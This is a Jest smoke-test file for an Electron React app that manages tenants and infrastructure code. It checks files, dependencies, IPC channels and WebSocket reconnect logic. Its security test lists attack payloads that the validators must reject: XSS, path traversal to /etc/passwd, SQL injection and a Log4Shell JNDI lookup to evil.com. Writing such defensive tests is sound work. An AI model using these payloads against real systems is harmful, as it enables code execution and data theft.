/**
 * Smoke tests to verify basic SPA functionality
 */

import * as path from 'path';
import * as fs from 'fs';

describe('SPA Smoke Tests', () => {
  test('package.json exists and has required scripts', () => {
    const packageJsonPath = path.join(__dirname, '../package.json');
    expect(fs.existsSync(packageJsonPath)).toBe(true);
    
    const packageJson = JSON.parse(fs.readFileSync(packageJsonPath, 'utf-8'));
    
    // Check required scripts
    expect(packageJson.scripts).toHaveProperty('dev');
    expect(packageJson.scripts).toHaveProperty('build');
    expect(packageJson.scripts).toHaveProperty('test');
    expect(packageJson.scripts).toHaveProperty('start');
  });

  test('main entry point exists', () => {
    const mainPath = path.join(__dirname, '../main/index.ts');
    expect(fs.existsSync(mainPath)).toBe(true);
  });

  test('renderer entry point exists', () => {
    const rendererPath = path.join(__dirname, '../renderer/src/main.tsx');
    expect(fs.existsSync(rendererPath)).toBe(true);
  });

  test('all required components exist', () => {
    const components = [
      '../renderer/src/components/tabs/BuildTab.tsx',
      '../renderer/src/components/tabs/GenerateSpecTab.tsx',
      '../renderer/src/components/tabs/GenerateIaCTab.tsx',
      '../renderer/src/components/tabs/CreateTenantTab.tsx',
      '../renderer/src/components/tabs/VisualizeTab.tsx',
      '../renderer/src/components/tabs/ConfigTab.tsx',
      '../renderer/src/components/widgets/GraphViewer.tsx',
    ];
    
    components.forEach(component => {
      const componentPath = path.join(__dirname, component);
      expect(fs.existsSync(componentPath)).toBe(true);
    });
  });

  test('WebSocket server exists', () => {
    const serverPath = path.join(__dirname, '../backend/src/server.ts');
    expect(fs.existsSync(serverPath)).toBe(true);
  });

  test('validation utilities exist', () => {
    const validationPath = path.join(__dirname, '../renderer/src/utils/validation.ts');
    expect(fs.existsSync(validationPath)).toBe(true);
    
    // Import and test validation functions
    const validation = require('../renderer/src/utils/validation');
    
    // Test UUID validation
    expect(validation.isValidUUID('12345678-1234-1234-1234-123456789012')).toBe(true);
    expect(validation.isValidUUID('not-a-uuid')).toBe(false);
    
    // Test tenant ID validation
    expect(validation.isValidTenantId('12345678-1234-1234-1234-123456789012')).toBe(true);
    expect(validation.isValidTenantId('')).toBe(false);
    
    // Test resource limit validation
    expect(validation.isValidResourceLimit(100)).toBe(true);
    expect(validation.isValidResourceLimit(-1)).toBe(false);
    expect(validation.isValidResourceLimit(20000)).toBe(false);
  });

  test('IPC handlers are properly configured', () => {
    const ipcHandlersPath = path.join(__dirname, '../main/ipc-handlers.ts');
    expect(fs.existsSync(ipcHandlersPath)).toBe(true);
    
    const content = fs.readFileSync(ipcHandlersPath, 'utf-8');
    
    // Check for required IPC channels
    expect(content).toContain('cli:execute');
    expect(content).toContain('cli:stop');
    expect(content).toContain('store:get');
    expect(content).toContain('store:set');
  });

  test('critical dependencies are installed', () => {
    const packageJson = JSON.parse(
      fs.readFileSync(path.join(__dirname, '../package.json'), 'utf-8')
    );
    
    const requiredDeps = [
      '@mui/material',
      'react',
      'react-dom',
      'electron-store',
      'socket.io',
      'socket.io-client',
      'vis-network',
      '@monaco-editor/react',
    ];
    
    requiredDeps.forEach(dep => {
      expect(
        packageJson.dependencies[dep] || packageJson.devDependencies[dep]
      ).toBeDefined();
    });
  });

  test('test infrastructure is configured', () => {
    // Jest config exists
    const jestConfigPath = path.join(__dirname, '../jest.config.js');
    expect(fs.existsSync(jestConfigPath)).toBe(true);
    
    // Playwright config exists
    const playwrightConfigPath = path.join(__dirname, '../playwright.config.ts');
    expect(fs.existsSync(playwrightConfigPath)).toBe(true);
    
    // Setup files exist
    const setupTestsPath = path.join(__dirname, 'setupTests.ts');
    expect(fs.existsSync(setupTestsPath)).toBe(true);
  });

  test('E2E test files exist', () => {
    const e2eTests = [
      'e2e/app.spec.ts',
      'e2e/workflow.spec.ts',
    ];
    
    e2eTests.forEach(testFile => {
      const testPath = path.join(__dirname, testFile);
      expect(fs.existsSync(testPath)).toBe(true);
    });
  });

  test('integration test files exist', () => {
    const integrationTests = [
      'integration/build-operations.test.ts',
      'integration/websocket-streaming.test.ts',
    ];
    
    integrationTests.forEach(testFile => {
      const testPath = path.join(__dirname, testFile);
      expect(fs.existsSync(testPath)).toBe(true);
    });
  });
});

describe('WebSocket Hook Functionality', () => {
  test('useWebSocket hook exports required functions', () => {
    const hookPath = path.join(__dirname, '../renderer/src/hooks/useWebSocket.ts');
    expect(fs.existsSync(hookPath)).toBe(true);
    
    const content = fs.readFileSync(hookPath, 'utf-8');
    
    // Check for memory management features
    expect(content).toContain('MAX_OUTPUT_BUFFER_SIZE');
    expect(content).toContain('MAX_RECONNECT_DELAY');
    
    // Check for exponential backoff
    expect(content).toContain('getReconnectionDelay');
    expect(content).toContain('Math.pow(2, reconnectAttempt');
    
    // Check for cleanup
    expect(content).toContain('removeAllListeners');
    expect(content).toContain('subscribedProcesses.current.clear()');
  });
});

describe('Security Features', () => {
  test('input validation is implemented', () => {
    const validation = require('../renderer/src/utils/validation');
    
    // Test various malicious inputs
    const maliciousInputs = [
      '<script>alert("xss")</script>',
      '../../etc/passwd',
      'javascript:alert(1)',
      'DROP TABLE users;',
      '${jndi:ldap://evil.com/a}',
    ];
    
    maliciousInputs.forEach(input => {
      expect(validation.isValidTenantId(input)).toBe(false);
      expect(validation.isValidUUID(input)).toBe(false);
    });
  });

  test('CSP headers are configured', () => {
    const mainPath = path.join(__dirname, '../main/index.ts');
    const content = fs.readFileSync(mainPath, 'utf-8');
    
    // Check for CSP configuration
    expect(content).toContain('Content-Security-Policy');
  });

  test('ErrorBoundary component exists', () => {
    const errorBoundaryPath = path.join(__dirname, '../renderer/src/components/common/ErrorBoundary.tsx');
    expect(fs.existsSync(errorBoundaryPath)).toBe(true);
    
    const content = fs.readFileSync(errorBoundaryPath, 'utf-8');
    expect(content).toContain('componentDidCatch');
    expect(content).toContain('getDerivedStateFromError');
  });
});